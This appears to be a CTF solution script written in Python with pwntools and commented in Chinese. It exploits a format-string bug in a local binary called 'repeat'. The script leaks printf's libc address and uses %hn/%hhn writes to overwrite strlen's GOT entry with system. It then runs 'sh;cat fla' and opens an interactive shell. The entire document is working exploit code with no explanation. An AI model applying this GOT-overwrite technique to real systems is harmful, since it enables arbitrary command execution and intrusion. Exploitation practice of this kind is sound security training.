#!/usr/bin/env python2
#-*- coding: utf-8 -*-
from pwn import *
import struct
# 初始化变量
r_program = process('./repeat')
program = ELF('repeat')
libc = ELF('libc.so.6')

strlen_got = program.got['strlen']

system_program = 0
system_libc = libc.symbols['system']

printf_got = program.got['printf']
printf_program = 0
printf_libc = libc.symbols['printf']

before = 0

#read函数前，为了重复调用printf
run_address = 0x080485DC
#0x080485b1

#先读取前言
r_program.recvrepeat(timeout=1)


#构造exp 作用1：获取printf函数地址 作用2：把strcpy的got表地址修改为run_address
exp = ''
exp += struct.pack('<i', printf_got)
exp += struct.pack('<i', strlen_got)
exp += '[%4$.4s]'
exp += struct.pack('<i', strlen_got + 2)
a = run_address % 0x10000
exp += '%' + str(a - 18) +'c%5$hn'
b = 0xffff - a + run_address // 0x10000 + 1
exp += '%' + str(b) +'c%8$hn'

#发送数据
print('正在写入向%08x写入%08x' % (strlen_got, run_address))
r_program.sendline(exp)

#读取printf函数地址
address_text = r_program.recvrepeat(timeout=5)
text_left = address_text.find('[') + 1
address_text = address_text[text_left : text_left + 4]
print('printf地址文本为[%s]' % repr(address_text))

printf_program = struct.unpack('<I', address_text)[0]
#print(hex(printf_program))
print('printf地址为%08x' % (printf_program,))

#计算system函数地址
system_program = system_libc - printf_libc + printf_program
print('system地址为%08x' % (system_program,))

#构造exp 将strlen的地址写为system的地址
exp = ''
exp += 'sh;cat fla #'
exp += struct.pack('<I', strlen_got)
exp += struct.pack('<I', strlen_got + 1)
exp += struct.pack('<I', strlen_got + 2)
exp += struct.pack('<I', strlen_got + 3)
addr1 = system_program % 0x100 - 28
while addr1 < 0:
    addr1 += 0x100
before += addr1 + 28
exp += '%' + str(addr1) +'c%12$hhn'
addr2 = (system_program // 0x100) % 0x100- before
#print("[%02x]" % (addr2 + addr1,))
while addr2 < 0:
    addr2 += 0x100
before += addr2
exp += '%' + str(addr2) +'c%13$hhn'
addr3 = (system_program // 0x10000) % 0x100 - before
while addr3 < 0:
    addr3 += 0x100
before += addr3
exp += '%' + str(addr3) +'c%14$hhn'
addr4 = system_program // 0x1000000 - before
while addr4 < 0:
    addr4 += 0x100
exp += '%' + str(addr4) +'c%15$hhn[]\x00'
#发送数据
print('正在写入向%08x写入%08x' % (strlen_got, system_program))
r_program.sendline(exp)

#获取回复
text = r_program.recvrepeat(timeout=10)
text = text[text.find('[]') + 2:]
print(text)
#print(repr(r_program.recvrepeat(timeout=10).replace('  ','')))

#获取shell
r_program.interactive() 